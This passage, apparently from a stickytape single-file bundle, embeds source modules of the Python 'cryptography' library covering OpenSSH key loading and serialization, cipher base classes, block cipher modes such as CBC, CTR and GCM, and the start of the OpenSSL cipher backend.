keypair[32:]\r\n        if point != point2 or (point,) != pubfields:\r\n            raise ValueError("Corrupt data: ed25519 field mismatch")\r\n        private_key = ed25519.Ed25519PrivateKey.from_private_bytes(secret)\r\n        return private_key, data\r\n\r\n    def encode_public(\r\n        self, public_key: ed25519.Ed25519PublicKey, f_pub: _FragList\r\n    ) -> None:\r\n        """Write Ed25519 public key"""\r\n        raw_public_key = public_key.public_bytes(\r\n            Encoding.Raw, PublicFormat.Raw\r\n        )\r\n        f_pub.put_sshstr(raw_public_key)\r\n\r\n    def encode_private(\r\n        self, private_key: ed25519.Ed25519PrivateKey, f_priv: _FragList\r\n    ) -> None:\r\n        """Write Ed25519 private key"""\r\n        public_key = private_key.public_key()\r\n        raw_private_key = private_key.private_bytes(\r\n            Encoding.Raw, PrivateFormat.Raw, NoEncryption()\r\n        )\r\n        raw_public_key = public_key.public_bytes(\r\n            Encoding.Raw, PublicFormat.Raw\r\n        )\r\n        f_keypair = _FragList([raw_private_key, raw_public_key])\r\n\r\n        self.encode_public(public_key, f_priv)\r\n        f_priv.put_sshstr(f_keypair)\r\n\r\n\r\n_KEY_FORMATS = {\r\n    _SSH_RSA: _SSHFormatRSA(),\r\n    _SSH_DSA: _SSHFormatDSA(),\r\n    _SSH_ED25519: _SSHFormatEd25519(),\r\n    _ECDSA_NISTP256: _SSHFormatECDSA(b"nistp256", ec.SECP256R1()),\r\n    _ECDSA_NISTP384: _SSHFormatECDSA(b"nistp384", ec.SECP384R1()),\r\n    _ECDSA_NISTP521: _SSHFormatECDSA(b"nistp521", ec.SECP521R1()),\r\n}\r\n\r\n\r\ndef _lookup_kformat(key_type: bytes):\r\n    """Return valid format or throw error"""\r\n    if not isinstance(key_type, bytes):\r\n        key_type = memoryview(key_type).tobytes()\r\n    if key_type in _KEY_FORMATS:\r\n        return _KEY_FORMATS[key_type]\r\n    raise UnsupportedAlgorithm(f"Unsupported key type: {key_type!r}")\r\n\r\n\r\n_SSH_PRIVATE_KEY_TYPES = typing.Union[\r\n    ec.EllipticCurvePrivateKey,\r\n    rsa.RSAPrivateKey,\r\n    dsa.DSAPrivateKey,\r\n    ed25519.Ed25519PrivateKey,\r\n]\r\n\r\n\r\ndef load_ssh_private_key(\r\n    data: bytes,\r\n    password: typing.Optional[bytes],\r\n    backend: typing.Any = None,\r\n) -> _SSH_PRIVATE_KEY_TYPES:\r\n    """Load private key from OpenSSH custom encoding."""\r\n    utils._check_byteslike("data", data)\r\n    if password is not None:\r\n        utils._check_bytes("password", password)\r\n\r\n    m = _PEM_RC.search(data)\r\n    if not m:\r\n        raise ValueError("Not OpenSSH private key format")\r\n    p1 = m.start(1)\r\n    p2 = m.end(1)\r\n    data = binascii.a2b_base64(memoryview(data)[p1:p2])\r\n    if not data.startswith(_SK_MAGIC):\r\n        raise ValueError("Not OpenSSH private key format")\r\n    data = memoryview(data)[len(_SK_MAGIC) :]\r\n\r\n    # parse header\r\n    ciphername, data = _get_sshstr(data)\r\n    kdfname, data = _get_sshstr(data)\r\n    kdfoptions, data = _get_sshstr(data)\r\n    nkeys, data = _get_u32(data)\r\n    if nkeys != 1:\r\n        raise ValueError("Only one key supported")\r\n\r\n    # load public key data\r\n    pubdata, data = _get_sshstr(data)\r\n    pub_key_type, pubdata = _get_sshstr(pubdata)\r\n    kformat = _lookup_kformat(pub_key_type)\r\n    pubfields, pubdata = kformat.get_public(pubdata)\r\n    _check_empty(pubdata)\r\n\r\n    # load secret data\r\n    edata, data = _get_sshstr(data)\r\n    _check_empty(data)\r\n\r\n    if (ciphername, kdfname) != (_NONE, _NONE):\r\n        ciphername_bytes = ciphername.tobytes()\r\n        if ciphername_bytes not in _SSH_CIPHERS:\r\n            raise UnsupportedAlgorithm(\r\n                f"Unsupported cipher: {ciphername_bytes!r}"\r\n            )\r\n        if kdfname != _BCRYPT:\r\n            raise UnsupportedAlgorithm(f"Unsupported KDF: {kdfname!r}")\r\n        blklen = _SSH_CIPHERS[ciphername_bytes][3]\r\n        _check_block_size(edata, blklen)\r\n        salt, kbuf = _get_sshstr(kdfoptions)\r\n        rounds, kbuf = _get_u32(kbuf)\r\n        _check_empty(kbuf)\r\n        ciph = _init_cipher(ciphername_bytes, password, salt.tobytes(), rounds)\r\n        edata = memoryview(ciph.decryptor().update(edata))\r\n    else:\r\n        blklen = 8\r\n        _check_block_size(edata, blklen)\r\n    ck1, edata = _get_u32(edata)\r\n    ck2, edata = _get_u32(edata)\r\n    if ck1 != ck2:\r\n        raise ValueError("Corrupt data: broken checksum")\r\n\r\n    # load per-key struct\r\n    key_type, edata = _get_sshstr(edata)\r\n    if key_type != pub_key_type:\r\n        raise ValueError("Corrupt data: key type mismatch")\r\n    private_key, edata = kformat.load_private(edata, pubfields)\r\n    comment, edata = _get_sshstr(edata)\r\n\r\n    # yes, SSH does padding check *after* all other parsing is done.\r\n    # need to follow as it writes zero-byte padding too.\r\n    if edata != _PADDING[: len(edata)]:\r\n        raise ValueError("Corrupt data: invalid padding")\r\n\r\n    return private_key\r\n\r\n\r\ndef serialize_ssh_private_key(\r\n    private_key: _SSH_PRIVATE_KEY_TYPES,\r\n    password: typing.Optional[bytes] = None,\r\n) -> bytes:\r\n    """Serialize private key with OpenSSH custom encoding."""\r\n    if password is not None:\r\n        utils._check_bytes("password", password)\r\n    if password and len(password) > _MAX_PASSWORD:\r\n        raise ValueError(\r\n            "Passwords longer than 72 bytes are not supported by "\r\n            "OpenSSH private key format"\r\n        )\r\n\r\n    if isinstance(private_key, ec.EllipticCurvePrivateKey):\r\n        key_type = _ecdsa_key_type(private_key.public_key())\r\n    elif isinstance(private_key, rsa.RSAPrivateKey):\r\n        key_type = _SSH_RSA\r\n    elif isinstance(private_key, dsa.DSAPrivateKey):\r\n        key_type = _SSH_DSA\r\n    elif isinstance(private_key, ed25519.Ed25519PrivateKey):\r\n        key_type = _SSH_ED25519\r\n    else:\r\n        raise ValueError("Unsupported key type")\r\n    kformat = _lookup_kformat(key_type)\r\n\r\n    # setup parameters\r\n    f_kdfoptions = _FragList()\r\n    if password:\r\n        ciphername = _DEFAULT_CIPHER\r\n        blklen = _SSH_CIPHERS[ciphername][3]\r\n        kdfname = _BCRYPT\r\n        rounds = _DEFAULT_ROUNDS\r\n        salt = os.urandom(16)\r\n        f_kdfoptions.put_sshstr(salt)\r\n        f_kdfoptions.put_u32(rounds)\r\n        ciph = _init_cipher(ciphername, password, salt, rounds)\r\n    else:\r\n        ciphername = kdfname = _NONE\r\n        blklen = 8\r\n        ciph = None\r\n    nkeys = 1\r\n    checkval = os.urandom(4)\r\n    comment = b""\r\n\r\n    # encode public and private parts together\r\n    f_public_key = _FragList()\r\n    f_public_key.put_sshstr(key_type)\r\n    kformat.encode_public(private_key.public_key(), f_public_key)\r\n\r\n    f_secrets = _FragList([checkval, checkval])\r\n    f_secrets.put_sshstr(key_type)\r\n    kformat.encode_private(private_key, f_secrets)\r\n    f_secrets.put_sshstr(comment)\r\n    f_secrets.put_raw(_PADDING[: blklen - (f_secrets.size() % blklen)])\r\n\r\n    # top-level structure\r\n    f_main = _FragList()\r\n    f_main.put_raw(_SK_MAGIC)\r\n    f_main.put_sshstr(ciphername)\r\n    f_main.put_sshstr(kdfname)\r\n    f_main.put_sshstr(f_kdfoptions)\r\n    f_main.put_u32(nkeys)\r\n    f_main.put_sshstr(f_public_key)\r\n    f_main.put_sshstr(f_secrets)\r\n\r\n    # copy result info bytearray\r\n    slen = f_secrets.size()\r\n    mlen = f_main.size()\r\n    buf = memoryview(bytearray(mlen + blklen))\r\n    f_main.render(buf)\r\n    ofs = mlen - slen\r\n\r\n    # encrypt in-place\r\n    if ciph is not None:\r\n        ciph.encryptor().update_into(buf[ofs:mlen], buf[ofs:])\r\n\r\n    txt = _ssh_pem_encode(buf[:mlen])\r\n    buf[ofs:mlen] = bytearray(slen)\r\n    return txt\r\n\r\n\r\n_SSH_PUBLIC_KEY_TYPES = typing.Union[\r\n    ec.EllipticCurvePublicKey,\r\n    rsa.RSAPublicKey,\r\n    dsa.DSAPublicKey,\r\n    ed25519.Ed25519PublicKey,\r\n]\r\n\r\n\r\ndef load_ssh_public_key(\r\n    data: bytes, backend: typing.Any = None\r\n) -> _SSH_PUBLIC_KEY_TYPES:\r\n    """Load public key from OpenSSH one-line format."""\r\n    utils._check_byteslike("data", data)\r\n\r\n    m = _SSH_PUBKEY_RC.match(data)\r\n    if not m:\r\n        raise ValueError("Invalid line format")\r\n    key_type = orig_key_type = m.group(1)\r\n    key_body = m.group(2)\r\n    with_cert = False\r\n    if _CERT_SUFFIX == key_type[-len(_CERT_SUFFIX) :]:\r\n        with_cert = True\r\n        key_type = key_type[: -len(_CERT_SUFFIX)]\r\n    kformat = _lookup_kformat(key_type)\r\n\r\n    try:\r\n        rest = memoryview(binascii.a2b_base64(key_body))\r\n    except (TypeError, binascii.Error):\r\n        raise ValueError("Invalid key format")\r\n\r\n    inner_key_type, rest = _get_sshstr(rest)\r\n    if inner_key_type != orig_key_type:\r\n        raise ValueError("Invalid key format")\r\n    if with_cert:\r\n        nonce, rest = _get_sshstr(rest)\r\n    public_key, rest = kformat.load_public(rest)\r\n    if with_cert:\r\n        serial, rest = _get_u64(rest)\r\n        cctype, rest = _get_u32(rest)\r\n        key_id, rest = _get_sshstr(rest)\r\n        principals, rest = _get_sshstr(rest)\r\n        valid_after, rest = _get_u64(rest)\r\n        valid_before, rest = _get_u64(rest)\r\n        crit_options, rest = _get_sshstr(rest)\r\n        extensions, rest = _get_sshstr(rest)\r\n        reserved, rest = _get_sshstr(rest)\r\n        sig_key, rest = _get_sshstr(rest)\r\n        signature, rest = _get_sshstr(rest)\r\n    _check_empty(rest)\r\n    return public_key\r\n\r\n\r\ndef serialize_ssh_public_key(public_key: _SSH_PUBLIC_KEY_TYPES) -> bytes:\r\n    """One-line public key format for OpenSSH"""\r\n    if isinstance(public_key, ec.EllipticCurvePublicKey):\r\n        key_type = _ecdsa_key_type(public_key)\r\n    elif isinstance(public_key, rsa.RSAPublicKey):\r\n        key_type = _SSH_RSA\r\n    elif isinstance(public_key, dsa.DSAPublicKey):\r\n        key_type = _SSH_DSA\r\n    elif isinstance(public_key, ed25519.Ed25519PublicKey):\r\n        key_type = _SSH_ED25519\r\n    else:\r\n        raise ValueError("Unsupported key type")\r\n    kformat = _lookup_kformat(key_type)\r\n\r\n    f_pub = _FragList()\r\n    f_pub.put_sshstr(key_type)\r\n    kformat.encode_public(public_key, f_pub)\r\n\r\n    pub = binascii.b2a_base64(f_pub.tobytes()).strip()\r\n    return b"".join([key_type, b" ", pub])\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/ciphers/__init__.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nfrom cryptography.hazmat.primitives._cipheralgorithm import (\r\n    BlockCipherAlgorithm,\r\n    CipherAlgorithm,\r\n)\r\nfrom cryptography.hazmat.primitives.ciphers.base import (\r\n    AEADCipherContext,\r\n    AEADDecryptionContext,\r\n    AEADEncryptionContext,\r\n    Cipher,\r\n    CipherContext,\r\n)\r\n\r\n\r\n__all__ = [\r\n    "Cipher",\r\n    "CipherAlgorithm",\r\n    "BlockCipherAlgorithm",\r\n    "CipherContext",\r\n    "AEADCipherContext",\r\n    "AEADDecryptionContext",\r\n    "AEADEncryptionContext",\r\n]\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/_cipheralgorithm.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport abc\r\nimport typing\r\n\r\n\r\n# This exists to break an import cycle. It is normally accessible from the\r\n# ciphers module.\r\n\r\n\r\nclass CipherAlgorithm(metaclass=abc.ABCMeta):\r\n    @abc.abstractproperty\r\n    def name(self) -> str:\r\n        """\r\n        A string naming this mode (e.g. "AES", "Camellia").\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def key_sizes(self) -> typing.FrozenSet[int]:\r\n        """\r\n        Valid key sizes for this algorithm in bits\r\n        """\r\n\r\n    @abc.abstractproperty\r\n    def key_size(self) -> int:\r\n        """\r\n        The size of the key being used as an integer in bits (e.g. 128, 256).\r\n        """\r\n\r\n\r\nclass BlockCipherAlgorithm(metaclass=abc.ABCMeta):\r\n    key: bytes\r\n\r\n    @abc.abstractproperty\r\n    def block_size(self) -> int:\r\n        """\r\n        The size of a block as an integer in bits (e.g. 64, 128).\r\n        """\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/ciphers/base.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport abc\r\nimport typing\r\n\r\nfrom cryptography.exceptions import (\r\n    AlreadyFinalized,\r\n    AlreadyUpdated,\r\n    NotYetFinalized,\r\n)\r\nfrom cryptography.hazmat.primitives._cipheralgorithm import CipherAlgorithm\r\nfrom cryptography.hazmat.primitives.ciphers import modes\r\n\r\n\r\nif typing.TYPE_CHECKING:\r\n    from cryptography.hazmat.backends.openssl.ciphers import (\r\n        _CipherContext as _BackendCipherContext,\r\n    )\r\n\r\n\r\nclass CipherContext(metaclass=abc.ABCMeta):\r\n    @abc.abstractmethod\r\n    def update(self, data: bytes) -> bytes:\r\n        """\r\n        Processes the provided bytes through the cipher and returns the results\r\n        as bytes.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def update_into(self, data: bytes, buf: bytes) -> int:\r\n        """\r\n        Processes the provided bytes and writes the resulting data into the\r\n        provided buffer. Returns the number of bytes written.\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def finalize(self) -> bytes:\r\n        """\r\n        Returns the results of processing the final block as bytes.\r\n        """\r\n\r\n\r\nclass AEADCipherContext(CipherContext, metaclass=abc.ABCMeta):\r\n    @abc.abstractmethod\r\n    def authenticate_additional_data(self, data: bytes) -> None:\r\n        """\r\n        Authenticates the provided bytes.\r\n        """\r\n\r\n\r\nclass AEADDecryptionContext(AEADCipherContext, metaclass=abc.ABCMeta):\r\n    @abc.abstractmethod\r\n    def finalize_with_tag(self, tag: bytes) -> bytes:\r\n        """\r\n        Returns the results of processing the final block as bytes and allows\r\n        delayed passing of the authentication tag.\r\n        """\r\n\r\n\r\nclass AEADEncryptionContext(AEADCipherContext, metaclass=abc.ABCMeta):\r\n    @abc.abstractproperty\r\n    def tag(self) -> bytes:\r\n        """\r\n        Returns tag bytes. This is only available after encryption is\r\n        finalized.\r\n        """\r\n\r\n\r\nMode = typing.TypeVar(\r\n    "Mode", bound=typing.Optional[modes.Mode], covariant=True\r\n)\r\n\r\n\r\nclass Cipher(typing.Generic[Mode]):\r\n    def __init__(\r\n        self,\r\n        algorithm: CipherAlgorithm,\r\n        mode: Mode,\r\n        backend: typing.Any = None,\r\n    ):\r\n\r\n        if not isinstance(algorithm, CipherAlgorithm):\r\n            raise TypeError("Expected interface of CipherAlgorithm.")\r\n\r\n        if mode is not None:\r\n            # mypy needs this assert to narrow the type from our generic\r\n            # type. Maybe it won\'t some time in the future.\r\n            assert isinstance(mode, modes.Mode)\r\n            mode.validate_for_algorithm(algorithm)\r\n\r\n        self.algorithm = algorithm\r\n        self.mode = mode\r\n\r\n    @typing.overload\r\n    def encryptor(\r\n        self: "Cipher[modes.ModeWithAuthenticationTag]",\r\n    ) -> AEADEncryptionContext:\r\n        ...\r\n\r\n    @typing.overload\r\n    def encryptor(\r\n        self: "_CIPHER_TYPE",\r\n    ) -> CipherContext:\r\n        ...\r\n\r\n    def encryptor(self):\r\n        if isinstance(self.mode, modes.ModeWithAuthenticationTag):\r\n            if self.mode.tag is not None:\r\n                raise ValueError(\r\n                    "Authentication tag must be None when encrypting."\r\n                )\r\n        from cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n        ctx = backend.create_symmetric_encryption_ctx(\r\n            self.algorithm, self.mode\r\n        )\r\n        return self._wrap_ctx(ctx, encrypt=True)\r\n\r\n    @typing.overload\r\n    def decryptor(\r\n        self: "Cipher[modes.ModeWithAuthenticationTag]",\r\n    ) -> AEADDecryptionContext:\r\n        ...\r\n\r\n    @typing.overload\r\n    def decryptor(\r\n        self: "_CIPHER_TYPE",\r\n    ) -> CipherContext:\r\n        ...\r\n\r\n    def decryptor(self):\r\n        from cryptography.hazmat.backends.openssl.backend import backend\r\n\r\n        ctx = backend.create_symmetric_decryption_ctx(\r\n            self.algorithm, self.mode\r\n        )\r\n        return self._wrap_ctx(ctx, encrypt=False)\r\n\r\n    def _wrap_ctx(\r\n        self, ctx: "_BackendCipherContext", encrypt: bool\r\n    ) -> typing.Union[\r\n        AEADEncryptionContext, AEADDecryptionContext, CipherContext\r\n    ]:\r\n        if isinstance(self.mode, modes.ModeWithAuthenticationTag):\r\n            if encrypt:\r\n                return _AEADEncryptionContext(ctx)\r\n            else:\r\n                return _AEADDecryptionContext(ctx)\r\n        else:\r\n            return _CipherContext(ctx)\r\n\r\n\r\n_CIPHER_TYPE = Cipher[\r\n    typing.Union[\r\n        modes.ModeWithNonce,\r\n        modes.ModeWithTweak,\r\n        None,\r\n        modes.ECB,\r\n        modes.ModeWithInitializationVector,\r\n    ]\r\n]\r\n\r\n\r\nclass _CipherContext(CipherContext):\r\n    _ctx: typing.Optional["_BackendCipherContext"]\r\n\r\n    def __init__(self, ctx: "_BackendCipherContext") -> None:\r\n        self._ctx = ctx\r\n\r\n    def update(self, data: bytes) -> bytes:\r\n        if self._ctx is None:\r\n            raise AlreadyFinalized("Context was already finalized.")\r\n        return self._ctx.update(data)\r\n\r\n    def update_into(self, data: bytes, buf: bytes) -> int:\r\n        if self._ctx is None:\r\n            raise AlreadyFinalized("Context was already finalized.")\r\n        return self._ctx.update_into(data, buf)\r\n\r\n    def finalize(self) -> bytes:\r\n        if self._ctx is None:\r\n            raise AlreadyFinalized("Context was already finalized.")\r\n        data = self._ctx.finalize()\r\n        self._ctx = None\r\n        return data\r\n\r\n\r\nclass _AEADCipherContext(AEADCipherContext):\r\n    _ctx: typing.Optional["_BackendCipherContext"]\r\n    _tag: typing.Optional[bytes]\r\n\r\n    def __init__(self, ctx: "_BackendCipherContext") -> None:\r\n        self._ctx = ctx\r\n        self._bytes_processed = 0\r\n        self._aad_bytes_processed = 0\r\n        self._tag = None\r\n        self._updated = False\r\n\r\n    def _check_limit(self, data_size: int) -> None:\r\n        if self._ctx is None:\r\n            raise AlreadyFinalized("Context was already finalized.")\r\n        self._updated = True\r\n        self._bytes_processed += data_size\r\n        if self._bytes_processed > self._ctx._mode._MAX_ENCRYPTED_BYTES:\r\n            raise ValueError(\r\n                "{} has a maximum encrypted byte limit of {}".format(\r\n                    self._ctx._mode.name, self._ctx._mode._MAX_ENCRYPTED_BYTES\r\n                )\r\n            )\r\n\r\n    def update(self, data: bytes) -> bytes:\r\n        self._check_limit(len(data))\r\n        # mypy needs this assert even though _check_limit already checked\r\n        assert self._ctx is not None\r\n        return self._ctx.update(data)\r\n\r\n    def update_into(self, data: bytes, buf: bytes) -> int:\r\n        self._check_limit(len(data))\r\n        # mypy needs this assert even though _check_limit already checked\r\n        assert self._ctx is not None\r\n        return self._ctx.update_into(data, buf)\r\n\r\n    def finalize(self) -> bytes:\r\n        if self._ctx is None:\r\n            raise AlreadyFinalized("Context was already finalized.")\r\n        data = self._ctx.finalize()\r\n        self._tag = self._ctx.tag\r\n        self._ctx = None\r\n        return data\r\n\r\n    def authenticate_additional_data(self, data: bytes) -> None:\r\n        if self._ctx is None:\r\n            raise AlreadyFinalized("Context was already finalized.")\r\n        if self._updated:\r\n            raise AlreadyUpdated("Update has been called on this context.")\r\n\r\n        self._aad_bytes_processed += len(data)\r\n        if self._aad_bytes_processed > self._ctx._mode._MAX_AAD_BYTES:\r\n            raise ValueError(\r\n                "{} has a maximum AAD byte limit of {}".format(\r\n                    self._ctx._mode.name, self._ctx._mode._MAX_AAD_BYTES\r\n                )\r\n            )\r\n\r\n        self._ctx.authenticate_additional_data(data)\r\n\r\n\r\nclass _AEADDecryptionContext(_AEADCipherContext, AEADDecryptionContext):\r\n    def finalize_with_tag(self, tag: bytes) -> bytes:\r\n        if self._ctx is None:\r\n            raise AlreadyFinalized("Context was already finalized.")\r\n        data = self._ctx.finalize_with_tag(tag)\r\n        self._tag = self._ctx.tag\r\n        self._ctx = None\r\n        return data\r\n\r\n\r\nclass _AEADEncryptionContext(_AEADCipherContext, AEADEncryptionContext):\r\n    @property\r\n    def tag(self) -> bytes:\r\n        if self._ctx is not None:\r\n            raise NotYetFinalized(\r\n                "You must finalize encryption before " "getting the tag."\r\n            )\r\n        assert self._tag is not None\r\n        return self._tag\r\n')
    __stickytape_write_module('cryptography/hazmat/primitives/ciphers/modes.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\n\r\nimport abc\r\nimport typing\r\n\r\nfrom cryptography import utils\r\nfrom cryptography.exceptions import UnsupportedAlgorithm, _Reasons\r\nfrom cryptography.hazmat.primitives._cipheralgorithm import (\r\n    BlockCipherAlgorithm,\r\n    CipherAlgorithm,\r\n)\r\n\r\n\r\nclass Mode(metaclass=abc.ABCMeta):\r\n    @abc.abstractproperty\r\n    def name(self) -> str:\r\n        """\r\n        A string naming this mode (e.g. "ECB", "CBC").\r\n        """\r\n\r\n    @abc.abstractmethod\r\n    def validate_for_algorithm(self, algorithm: CipherAlgorithm) -> None:\r\n        """\r\n        Checks that all the necessary invariants of this (mode, algorithm)\r\n        combination are met.\r\n        """\r\n\r\n\r\nclass ModeWithInitializationVector(Mode, metaclass=abc.ABCMeta):\r\n    @abc.abstractproperty\r\n    def initialization_vector(self) -> bytes:\r\n        """\r\n        The value of the initialization vector for this mode as bytes.\r\n        """\r\n\r\n\r\nclass ModeWithTweak(Mode, metaclass=abc.ABCMeta):\r\n    @abc.abstractproperty\r\n    def tweak(self) -> bytes:\r\n        """\r\n        The value of the tweak for this mode as bytes.\r\n        """\r\n\r\n\r\nclass ModeWithNonce(Mode, metaclass=abc.ABCMeta):\r\n    @abc.abstractproperty\r\n    def nonce(self) -> bytes:\r\n        """\r\n        The value of the nonce for this mode as bytes.\r\n        """\r\n\r\n\r\nclass ModeWithAuthenticationTag(Mode, metaclass=abc.ABCMeta):\r\n    @abc.abstractproperty\r\n    def tag(self) -> typing.Optional[bytes]:\r\n        """\r\n        The value of the tag supplied to the constructor of this mode.\r\n        """\r\n\r\n\r\ndef _check_aes_key_length(self: Mode, algorithm: CipherAlgorithm) -> None:\r\n    if algorithm.key_size > 256 and algorithm.name == "AES":\r\n        raise ValueError(\r\n            "Only 128, 192, and 256 bit keys are allowed for this AES mode"\r\n        )\r\n\r\n\r\ndef _check_iv_length(\r\n    self: ModeWithInitializationVector, algorithm: BlockCipherAlgorithm\r\n) -> None:\r\n    if len(self.initialization_vector) * 8 != algorithm.block_size:\r\n        raise ValueError(\r\n            "Invalid IV size ({}) for {}.".format(\r\n                len(self.initialization_vector), self.name\r\n            )\r\n        )\r\n\r\n\r\ndef _check_nonce_length(\r\n    nonce: bytes, name: str, algorithm: CipherAlgorithm\r\n) -> None:\r\n    if not isinstance(algorithm, BlockCipherAlgorithm):\r\n        raise UnsupportedAlgorithm(\r\n            f"{name} requires a block cipher algorithm",\r\n            _Reasons.UNSUPPORTED_CIPHER,\r\n        )\r\n    if len(nonce) * 8 != algorithm.block_size:\r\n        raise ValueError(\r\n            "Invalid nonce size ({}) for {}.".format(len(nonce), name)\r\n        )\r\n\r\n\r\ndef _check_iv_and_key_length(\r\n    self: ModeWithInitializationVector, algorithm: CipherAlgorithm\r\n) -> None:\r\n    if not isinstance(algorithm, BlockCipherAlgorithm):\r\n        raise UnsupportedAlgorithm(\r\n            f"{self} requires a block cipher algorithm",\r\n            _Reasons.UNSUPPORTED_CIPHER,\r\n        )\r\n    _check_aes_key_length(self, algorithm)\r\n    _check_iv_length(self, algorithm)\r\n\r\n\r\nclass CBC(ModeWithInitializationVector):\r\n    name = "CBC"\r\n\r\n    def __init__(self, initialization_vector: bytes):\r\n        utils._check_byteslike("initialization_vector", initialization_vector)\r\n        self._initialization_vector = initialization_vector\r\n\r\n    @property\r\n    def initialization_vector(self) -> bytes:\r\n        return self._initialization_vector\r\n\r\n    validate_for_algorithm = _check_iv_and_key_length\r\n\r\n\r\nclass XTS(ModeWithTweak):\r\n    name = "XTS"\r\n\r\n    def __init__(self, tweak: bytes):\r\n        utils._check_byteslike("tweak", tweak)\r\n\r\n        if len(tweak) != 16:\r\n            raise ValueError("tweak must be 128-bits (16 bytes)")\r\n\r\n        self._tweak = tweak\r\n\r\n    @property\r\n    def tweak(self) -> bytes:\r\n        return self._tweak\r\n\r\n    def validate_for_algorithm(self, algorithm: CipherAlgorithm) -> None:\r\n        if algorithm.key_size not in (256, 512):\r\n            raise ValueError(\r\n                "The XTS specification requires a 256-bit key for AES-128-XTS"\r\n                " and 512-bit key for AES-256-XTS"\r\n            )\r\n\r\n\r\nclass ECB(Mode):\r\n    name = "ECB"\r\n\r\n    validate_for_algorithm = _check_aes_key_length\r\n\r\n\r\nclass OFB(ModeWithInitializationVector):\r\n    name = "OFB"\r\n\r\n    def __init__(self, initialization_vector: bytes):\r\n        utils._check_byteslike("initialization_vector", initialization_vector)\r\n        self._initialization_vector = initialization_vector\r\n\r\n    @property\r\n    def initialization_vector(self) -> bytes:\r\n        return self._initialization_vector\r\n\r\n    validate_for_algorithm = _check_iv_and_key_length\r\n\r\n\r\nclass CFB(ModeWithInitializationVector):\r\n    name = "CFB"\r\n\r\n    def __init__(self, initialization_vector: bytes):\r\n        utils._check_byteslike("initialization_vector", initialization_vector)\r\n        self._initialization_vector = initialization_vector\r\n\r\n    @property\r\n    def initialization_vector(self) -> bytes:\r\n        return self._initialization_vector\r\n\r\n    validate_for_algorithm = _check_iv_and_key_length\r\n\r\n\r\nclass CFB8(ModeWithInitializationVector):\r\n    name = "CFB8"\r\n\r\n    def __init__(self, initialization_vector: bytes):\r\n        utils._check_byteslike("initialization_vector", initialization_vector)\r\n        self._initialization_vector = initialization_vector\r\n\r\n    @property\r\n    def initialization_vector(self) -> bytes:\r\n        return self._initialization_vector\r\n\r\n    validate_for_algorithm = _check_iv_and_key_length\r\n\r\n\r\nclass CTR(ModeWithNonce):\r\n    name = "CTR"\r\n\r\n    def __init__(self, nonce: bytes):\r\n        utils._check_byteslike("nonce", nonce)\r\n        self._nonce = nonce\r\n\r\n    @property\r\n    def nonce(self) -> bytes:\r\n        return self._nonce\r\n\r\n    def validate_for_algorithm(self, algorithm: CipherAlgorithm) -> None:\r\n        _check_aes_key_length(self, algorithm)\r\n        _check_nonce_length(self.nonce, self.name, algorithm)\r\n\r\n\r\nclass GCM(ModeWithInitializationVector, ModeWithAuthenticationTag):\r\n    name = "GCM"\r\n    _MAX_ENCRYPTED_BYTES = (2**39 - 256) // 8\r\n    _MAX_AAD_BYTES = (2**64) // 8\r\n\r\n    def __init__(\r\n        self,\r\n        initialization_vector: bytes,\r\n        tag: typing.Optional[bytes] = None,\r\n        min_tag_length: int = 16,\r\n    ):\r\n        # OpenSSL 3.0.0 constrains GCM IVs to [64, 1024] bits inclusive\r\n        # This is a sane limit anyway so we\'ll enforce it here.\r\n        utils._check_byteslike("initialization_vector", initialization_vector)\r\n        if len(initialization_vector) < 8 or len(initialization_vector) > 128:\r\n            raise ValueError(\r\n                "initialization_vector must be between 8 and 128 bytes (64 "\r\n                "and 1024 bits)."\r\n            )\r\n        self._initialization_vector = initialization_vector\r\n        if tag is not None:\r\n            utils._check_bytes("tag", tag)\r\n            if min_tag_length < 4:\r\n                raise ValueError("min_tag_length must be >= 4")\r\n            if len(tag) < min_tag_length:\r\n                raise ValueError(\r\n                    "Authentication tag must be {} bytes or longer.".format(\r\n                        min_tag_length\r\n                    )\r\n                )\r\n        self._tag = tag\r\n        self._min_tag_length = min_tag_length\r\n\r\n    @property\r\n    def tag(self) -> typing.Optional[bytes]:\r\n        return self._tag\r\n\r\n    @property\r\n    def initialization_vector(self) -> bytes:\r\n        return self._initialization_vector\r\n\r\n    def validate_for_algorithm(self, algorithm: CipherAlgorithm) -> None:\r\n        _check_aes_key_length(self, algorithm)\r\n        if not isinstance(algorithm, BlockCipherAlgorithm):\r\n            raise UnsupportedAlgorithm(\r\n                "GCM requires a block cipher algorithm",\r\n                _Reasons.UNSUPPORTED_CIPHER,\r\n            )\r\n        block_size_bytes = algorithm.block_size // 8\r\n        if self._tag is not None and len(self._tag) > block_size_bytes:\r\n            raise ValueError(\r\n                "Authentication tag cannot be more than {} bytes.".format(\r\n                    block_size_bytes\r\n                )\r\n            )\r\n')
    __stickytape_write_module('cryptography/hazmat/backends/openssl/ciphers.py', b'# This file is dual licensed under the terms of the Apache License, Version\r\n# 2.0, and the BSD License. See the LICENSE file in the root of this repository\r\n# for complete details.\r\n\r\nimport typing\r\n\r\nfrom cryptography.exceptions import InvalidTag, UnsupportedAlgorithm, _Reasons\r\nfrom cryptography.hazmat.primitives import ciphers\r\nfrom cryptography.hazmat.primitives.ciphers import algorithms, modes\r\n\r\n\r\nif typing.TYPE_CHECKING:\r\n    from cryptography.hazmat.backends.openssl.backend import Backend\r\n\r\n\r\nclass _CipherContext:\r\n    _ENCRYPT = 1\r\n    _DECRYPT = 0\r\n    _MAX_CHUNK_SIZE = 2**30 - 1\r\n\r\n    def __init__(\r\n        self, backend: "Backend", cipher, mode, operation: int\r\n    ) -> None:\r\n        self._backend = backend\r\n        self._cipher = cipher\r\n        self._mode = mode\r\n        self._operation = operation\r\n        self._tag: typing.Optional[bytes] = 